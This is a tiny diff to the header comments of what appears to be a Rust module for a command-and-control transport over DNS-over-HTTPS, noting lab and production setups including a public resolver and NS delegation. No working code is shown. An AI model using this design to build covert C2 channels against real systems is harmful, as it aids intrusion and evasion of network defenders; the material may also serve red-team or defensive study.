@@ -1,4 +1,4 @@
-//! DoH C2 transport — RFC 8484. Same fragment encoding as dns.rs, carrier = HTTPS POST.
+//! DoH C2 transport: RFC 8484. Same fragment encoding as dns.rs, carrier is HTTPS POST.
 //! Lab: panel's /dns-query endpoint (TLS-pinned, same cert).
 //! Production: public DoH resolver + real domain + NS delegation.
 
